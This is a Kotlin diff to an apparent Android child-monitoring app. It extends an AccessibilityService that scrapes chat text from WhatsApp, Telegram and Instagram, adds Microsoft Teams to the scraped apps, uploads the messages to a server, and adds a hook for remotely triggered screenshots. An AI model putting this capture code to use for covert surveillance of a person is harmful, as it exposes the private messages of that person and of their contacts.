@@ -8,6 +8,7 @@ import com.monitor.child.appusage.AppBlocker
 import com.monitor.child.data.PreferencesManager
 import com.monitor.child.network.ApiClient
 import com.monitor.child.network.MessageUploader
+import com.monitor.child.screenshot.ScreenshotCapture
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -18,17 +19,21 @@ class MessageCaptureService : AccessibilityService() {
 
     companion object {
         private const val TAG = "MessageCaptureService"
+        /** Referencia estática para que MonitorService pueda solicitar capturas */
+        @Volatile
+        var instance: MessageCaptureService? = null
 
         const val PKG_WHATSAPP          = "com.whatsapp"
         const val PKG_WHATSAPP_BUSINESS = "com.whatsapp.w4b"
         const val PKG_TELEGRAM          = "org.telegram.messenger"
         const val PKG_INSTAGRAM         = "com.instagram.android"
+        const val PKG_TEAMS             = "com.microsoft.teams"
         const val PKG_YOUTUBE           = "com.google.android.youtube"
         const val PKG_TIKTOK            = "com.zhiliaoapp.musically"
         const val PKG_TIKTOK_ALT        = "com.ss.android.ugc.trill"
 
         private val MESSAGING_PKGS = setOf(
-            PKG_WHATSAPP, PKG_WHATSAPP_BUSINESS, PKG_TELEGRAM, PKG_INSTAGRAM,
+            PKG_WHATSAPP, PKG_WHATSAPP_BUSINESS, PKG_TELEGRAM, PKG_INSTAGRAM, PKG_TEAMS,
         )
         private val VIDEO_PKGS = setOf(PKG_YOUTUBE, PKG_TIKTOK, PKG_TIKTOK_ALT)
         private val ALL_PKGS   = MESSAGING_PKGS + VIDEO_PKGS
@@ -37,6 +42,7 @@ class MessageCaptureService : AccessibilityService() {
     private lateinit var prefs: PreferencesManager
     private lateinit var uploader: MessageUploader
     private lateinit var appBlocker: AppBlocker
+    private lateinit var screenshotCapture: ScreenshotCapture
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
 
     // Debounce: evita procesar el mismo texto dos veces seguidas por app
@@ -51,6 +57,8 @@ class MessageCaptureService : AccessibilityService() {
         uploader = MessageUploader(apiClient, prefs)
         appBlocker = AppBlocker(this, apiClient, prefs, scope)
         appBlocker.startMonitoring()
+        screenshotCapture = ScreenshotCapture(this, apiClient, prefs, scope)
+        instance = this
         Log.i(TAG, "AccessibilityService conectado")
     }
 
@@ -77,6 +85,7 @@ class MessageCaptureService : AccessibilityService() {
                 PKG_WHATSAPP, PKG_WHATSAPP_BUSINESS -> parseWhatsApp(root, pkg)
                 PKG_TELEGRAM                        -> parseTelegram(root)
                 PKG_INSTAGRAM                       -> parseInstagram(root)
+                PKG_TEAMS                           -> parseTeams(root)
                 PKG_YOUTUBE                         -> parseYouTube(root)
                 PKG_TIKTOK, PKG_TIKTOK_ALT          -> parseTikTok(root, pkg)
             }
@@ -200,6 +209,53 @@ class MessageCaptureService : AccessibilityService() {
         }
     }
 
+    // ─── Microsoft Teams ──────────────────────────────────────────────────
+
+    private fun parseTeams(root: AccessibilityNodeInfo) {
+        // Teams muestra el nombre del chat/canal en la barra de título
+        val contactName = findNodeText(root, "com.microsoft.teams:id/title")
+            ?: findNodeText(root, "com.microsoft.teams:id/chat_title")
+            ?: findNodeText(root, "com.microsoft.teams:id/toolbar_title")
+            ?: return
+
+        // Recoger nodos de texto que sean mensajes (puede variar entre versiones)
+        val messageNodes = root.findAccessibilityNodeInfosByViewId("com.microsoft.teams:id/message_body_text")
+            ?: emptyList()
+
+        val messages = mutableListOf<RawMessage>()
+        if (messageNodes.isNotEmpty()) {
+            for (node in messageNodes) {
+                val text = node.text?.toString() ?: continue
+                if (text.isBlank()) continue
+                messages.add(RawMessage(contactName, text, "incoming"))
+            }
+        } else {
+            // Fallback: recoger todos los nodos de texto de la pantalla
+            val allTexts = mutableListOf<AccessibilityNodeInfo>()
+            collectTextNodes(root, allTexts)
+            for (node in allTexts) {
+                val text = node.text?.toString() ?: continue
+                if (text.isBlank() || text == contactName) continue
+                messages.add(RawMessage(contactName, text, "incoming"))
+            }
+        }
+
+        if (messages.isEmpty()) return
+
+        val fingerprint = messages.takeLast(5).joinToString("|") { it.body }
+        if (lastProcessed["teams:$contactName"] == fingerprint) return
+        lastProcessed["teams:$contactName"] = fingerprint
+
+        scope.launch {
+            uploader.uploadMessages(
+                app = "teams",
+                contactName = contactName,
+                contactIdentifier = contactName,
+                messages = messages.takeLast(20),
+            )
+        }
+    }
+
     // ─── YouTube ──────────────────────────────────────────────────────────
 
     private fun parseYouTube(root: AccessibilityNodeInfo) {
@@ -267,11 +323,17 @@ class MessageCaptureService : AccessibilityService() {
         }
     }
 
+    /** Llamado externamente para tomar una captura de pantalla */
+    fun requestScreenshot() {
+        screenshotCapture.capture()
+    }
+
     override fun onInterrupt() {
         Log.w(TAG, "AccessibilityService interrumpido")
     }
 
     override fun onDestroy() {
+        instance = null
         scope.cancel()
         super.onDestroy()
     }
